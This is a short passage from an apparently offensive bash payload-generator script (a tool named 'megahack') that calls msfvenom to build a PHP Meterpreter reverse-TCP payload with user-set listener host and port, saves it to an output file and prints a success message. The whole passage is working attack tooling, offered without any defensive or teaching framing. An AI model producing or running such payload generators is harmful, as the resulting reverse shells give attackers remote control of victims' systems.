...
read file
echo " "
msfvenom -p php/meterpreter_reverse_tcp lhost="$lhost" LPORT="$lport" -f raw > $HOME/megahack/output/Bash/"$file".sh && tput setaf 2; echo " PAYLOAD GENERATED SUCCESSFULLY"
echo " "
